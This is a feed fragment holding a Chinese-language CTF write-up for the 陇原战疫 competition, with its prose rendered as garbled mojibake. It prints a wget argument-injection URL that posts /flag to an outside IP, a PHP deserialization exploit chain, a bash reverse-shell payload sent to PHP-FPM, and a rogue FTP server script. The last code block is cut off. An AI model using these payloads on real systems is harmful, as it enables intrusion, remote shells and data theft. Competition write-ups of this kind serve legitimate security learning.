&lt;p>æ¯”èµ›èƒ½æš´éœ²å‡ºæˆ‘å¤ªå¤šçŸ­æ¿äº†ï¼Œé—®é¢˜æŒºå¤§çš„&lt;/p>
&lt;p>é¦–å…ˆæ˜¯å®¹æ˜“æ‰‹å¿™è„šä¹±ï¼Œç¬¬äºŒæ˜¯ä»–å¦ˆçš„è·Ÿä¸ªè„‘ç˜«ä¸€æ ·æ‰¾åˆ°åŸé¢˜éƒ½ä¸ä¼šå˜é€šï¼Œç¬¬ä¸‰æ˜¯å°±ä¼šçbbä¸ä¼šå­¦javaï¼Œç¬¬å››æ˜¯ç¼ºä¹è·Ÿé˜Ÿå‹çš„æ²Ÿé€š&lt;/p>
&lt;p>å°±å·®ä¸€é¢˜å°±è¿›çº¿ä¸‹äº†ï¼Œè¿™ä¸€é¢˜å°±æŠ˜åœ¨æˆ‘è¿™é‡Œï¼ŒçœŸæ˜¯æˆ‘å…¨è´£ï¼ŒçœŸçš„å¾ˆå¯¹ä¸èµ·å¦å¤–çš„pwnçˆ·å’Œå¯†ç çˆ·ï¼Œå¤ªä¸¢äººäº†ï¼Œæˆ‘å…ˆç£•ä¸€ä¸ªï¼Œç„¶åç»™è‡ªå·±ä¸¤æ‹³&lt;/p>
&lt;p>å¤ªä»–å¦ˆå¯æƒœäº†ï¼Œè‰&lt;/p></description></item><item><title>é™‡åŸæˆ˜ç–«CTF Wp</title><link>https://amiaaaz.github.io/2021/11/16/longyuanzhanyi-ctf-wp/</link><pubDate>Tue, 16 Nov 2021 14:24:03 +0800</pubDate><guid>https://amiaaaz.github.io/2021/11/16/longyuanzhanyi-ctf-wp/</guid><description>&lt;h2 id="checkin">CheckIN&lt;/h2>
&lt;p>æ˜¯ä¸ªgoçš„æ–‡ä»¶ï¼Œå‘ç°äº†/wgetè·¯ç”±å¯ä»¥æ‰§è¡Œwgetå‘½ä»¤ï¼Œæ¥æ”¶çš„å‚æ•°å¯ä»¥æ˜¯ä¸ªæ•°ç»„&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211116141624569.png" alt="image-20211116141624569">&lt;/p>
&lt;p>åˆ©ç”¨wgetçš„å‚æ•°å¤–å¸¦flag&lt;/p>
&lt;pre tabindex="0">&lt;code>/wget?argv=1&amp;amp;agrv=--post-file&amp;amp;argv=/flag&amp;amp;agrv=http://101.35.114.107:8426/
&lt;/code>&lt;/pre>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211116142102694.png" alt="image-20211116142102694">&lt;/p>
&lt;h2 id="eaaasyphp">eaaasyphp&lt;/h2>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-php" data-lang="php">&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#75af00">php&lt;/span>
&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Check&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#111">$str1&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">false&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#111">$str2&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">false&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Esle&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#111">__wakeup&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#75af00">Check&lt;/span>&lt;span style="color:#f92672">::&lt;/span>&lt;span style="color:#111">$str1&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">true&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Hint&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#111">__wakeup&lt;/span>&lt;span style="color:#111">(){&lt;/span>
&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">hint&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;no hint&amp;#34;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#111">__destruct&lt;/span>&lt;span style="color:#111">(){&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#f92672">!&lt;/span>&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">hint&lt;/span>&lt;span style="color:#111">){&lt;/span>
&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">hint&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;phpinfo&amp;#34;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">hint&lt;/span>&lt;span style="color:#111">)();&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Bunny&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#111">__toString&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">Check&lt;/span>&lt;span style="color:#f92672">::&lt;/span>&lt;span style="color:#111">$str2&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#f92672">!&lt;/span>&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">data&lt;/span>&lt;span style="color:#111">){&lt;/span>
&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">data&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">$_REQUEST&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;data&amp;#39;&lt;/span>&lt;span style="color:#111">];&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#75af00">file_put_contents&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">filename&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">data&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">}&lt;/span> &lt;span style="color:#00a8c8">else&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">throw&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">Error&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Error&amp;#34;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Welcome&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#111">__invoke&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#75af00">Check&lt;/span>&lt;span style="color:#f92672">::&lt;/span>&lt;span style="color:#111">$str2&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">true&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#d88200">&amp;#34;Welcome&amp;#34;&lt;/span> &lt;span style="color:#f92672">.&lt;/span> &lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">username&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Bypass&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#111">__destruct&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">Check&lt;/span>&lt;span style="color:#f92672">::&lt;/span>&lt;span style="color:#111">$str1&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">str4&lt;/span>&lt;span style="color:#111">)();&lt;/span>
&lt;span style="color:#111">}&lt;/span> &lt;span style="color:#00a8c8">else&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">throw&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">Error&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Error&amp;#34;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">isset&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$_GET&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;code&amp;#39;&lt;/span>&lt;span style="color:#111">]))&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#75af00">unserialize&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$_GET&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;code&amp;#39;&lt;/span>&lt;span style="color:#111">]);&lt;/span>
&lt;span style="color:#111">}&lt;/span> &lt;span style="color:#00a8c8">else&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#75af00">highlight_file&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#00a8c8">__FILE__&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>è¿™ä¸ªé¢˜ï¼Œæ€ä¹ˆè¯´ è¿˜æ˜¯æˆ‘å¤ªå¹´è½»äº† æˆ‘ä»¥ä¸ºè¿™ä¸ªå°±æ˜¯ç®€å•çš„ååºåˆ—åŒ–+shellå†™å…¥ï¼Œç„¶åéå¸¸çš„ç–‘æƒ‘ä¸ºå•¥æœ¬åœ°å¯ä»¥ä½†æ˜¯è¿œç¨‹çš„shellæ­»æ´»å°±æ˜¯ä¸è½åœ°ï¼Œä¸€ç›´åœ¨æƒ³æ€ä¹ˆç»•è¿‡ï¼Œè¿™æ˜¯å½“æ—¶å°è¯•çš„exp.php&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-php" data-lang="php">&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#75af00">php&lt;/span>
&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Check&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#111">$str1&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">false&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#111">$str2&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">false&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Esle&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#111">$str3&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Bunny&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#111">$filename&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#111">$data&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Welcome&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#111">$username&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Bypass&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#111">$str4&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">$check&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">Check&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;span style="color:#111">$esle&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">Esle&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;span style="color:#111">$bypass&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">Bypass&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;span style="color:#111">$welcome&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">Welcome&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;span style="color:#111">$bunny&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">Bunny&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;span style="color:#111">$esle&lt;/span> &lt;span style="color:#f92672">-&amp;gt;&lt;/span> &lt;span style="color:#75af00">str3&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">$bypass&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#75715e">// $bypass -&amp;gt; str4 = &amp;#39;phpinfo&amp;#39;;
&lt;/span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#111">$bypass&lt;/span> &lt;span style="color:#f92672">-&amp;gt;&lt;/span> &lt;span style="color:#75af00">str4&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">$welcome&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">$welcome&lt;/span> &lt;span style="color:#f92672">-&amp;gt;&lt;/span> &lt;span style="color:#75af00">username&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">$bunny&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">$bunny&lt;/span> &lt;span style="color:#f92672">-&amp;gt;&lt;/span> &lt;span style="color:#75af00">filename&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;op.php&amp;#34;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">$bunny&lt;/span> &lt;span style="color:#f92672">-&amp;gt;&lt;/span> &lt;span style="color:#75af00">data&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;xyz&amp;#34;&lt;/span>
&lt;span style="color:#111">$payload&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">serialize&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$esle&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#00a8c8">echo&lt;/span> &lt;span style="color:#111">$payload&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>ç›´åˆ°èµ›åæ‰çŸ¥é“è¿™åˆåˆåˆæ˜¯fpmï¼Œéœ€è¦ç”¨ftpæ‰“fpmï¼Œå…·ä½“çš„å†…å®¹æˆ‘æœ€è¿‘ä¹Ÿæ­£åœ¨æ€»ç»“ï¼Œå¯ä»¥å‚è§-&amp;gt;&lt;a href="https://amiaaaz.github.io/2021/11/15/attack-php-fpm-study-notes/">æ”»å‡» PHP-FPM å­¦ä¹ ç¬”è®°&lt;/a>ï¼ˆè¿˜æ²¡å…¨éƒ¨æ”¶å°¾ï¼‰&lt;/p>
&lt;p>é¦–å…ˆæ˜¯ä¾æ®pç‰›çš„è„šæœ¬ç”Ÿæˆä¸€ä¸ªurlencodeçš„payloadï¼ˆè¿™é‡Œå¼•å·æœ‰é—®é¢˜çš„è¯ç›´æ¥æ”¹è„šæœ¬å§ï¼‰&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">$ python fpm.py 127.0.0.1 &lt;span style="color:#d88200">&amp;#39;/var/www/html/index.php&amp;#39;&lt;/span> -c &lt;span style="color:#d88200">&amp;#39;&amp;lt;?php exec(&amp;#34;bash -c \&amp;#39;&lt;/span>/bin/bash -i &amp;gt;&lt;span style="color:#111">&amp;amp;&lt;/span> /dev/tcp/101.35.114.107/8426 0&amp;gt;&lt;span style="color:#111">&amp;amp;&lt;/span>1&lt;span style="color:#8045ff">\&amp;#39;&lt;/span>&lt;span style="color:#d88200">&amp;#34;);?&amp;gt;&amp;#39;
&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>ç„¶åå¼€ä¸€ä¸ªæ¶æ„çš„ftp-server&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">socket&lt;/span>
&lt;span style="color:#111">s&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">socket&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">socket&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">socket&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">AF_INET&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">socket&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">SOCK_STREAM&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">s&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">bind&lt;/span>&lt;span style="color:#111">((&lt;/span>&lt;span style="color:#d88200">&amp;#39;0.0.0.0&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#ae81ff">8001&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;span style="color:#111">s&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">listen&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">conn&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">addr&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">s&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">accept&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;span style="color:#111">conn&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">send&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#39;220 welcome&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#75715e">#Service ready for new user.&lt;/span>
&lt;span style="color:#75715e">#Client send anonymous username&lt;/span>
&lt;span style="color:#75715e">#USER anonymous&lt;/span>
&lt;span style="color:#111">conn&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">send&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#39;331 Please specify the password.&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#75715e">#User name okay, need password.&lt;/span>
&lt;span style="color:#75715e">#Client send anonymous password.&lt;/span>
&lt;span style="color:#75715e">#PASS anonymous&lt;/span>
&lt;span style="color:#111">conn&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">send&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#39;230 Login successful.&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#75715e">#User logged in, proceed. Logged out if appropriate.&lt;/span>
&lt;span style="color:#75715e">#TYPE I&lt;/span>
&lt;span style="color:#111">conn&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">send&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#39;200 Switching to Binary mode.&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#75715e">#Size /&lt;/span>
&lt;span style="color:#111">conn&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">send&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#39;550 Could not get the file size.&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#75715e">#EPSV (1)&lt;/span>
&lt;span style="color:#111">conn&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">send&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#39;150 ok&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#75715e">#PASV&lt;/span>
&lt;span style="color:#111">conn&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">send&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#39;227 Entering Extended Passive Mode (127,0,0,1,0,9000)&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#75715e">#STOR / (2)&lt;/span>
&lt;span style="color:#111">conn&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">send&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#39;150 Permission denied.&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#75715e">#QUIT&lt;/span>
&lt;span style="color:#111">conn&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">send&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#39;221 Goodbye.&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">conn&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">close&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;endd&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>ä¿®æ”¹ä¹‹å‰çš„ååºåˆ—åŒ–exp&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-php" data-lang="php">&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#75af00">php&lt;/span>
&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Bunny&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#111">__construct&lt;/span>&lt;span style="color:#111">(){&lt;/span>
&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">data&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">urldecode&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;xxxxxxxxxxxxxxxxxx&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">filename&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;ftp://101.35.114.107:8001/aaa&amp;#34;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Welcome&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#111">__construct&lt;/span>&lt;span style="color:#111">(){&lt;/span>
&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">username&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">Bunny&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Bypass&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#111">__construct&lt;/span>&lt;span style="color:#111">(){&lt;/span>
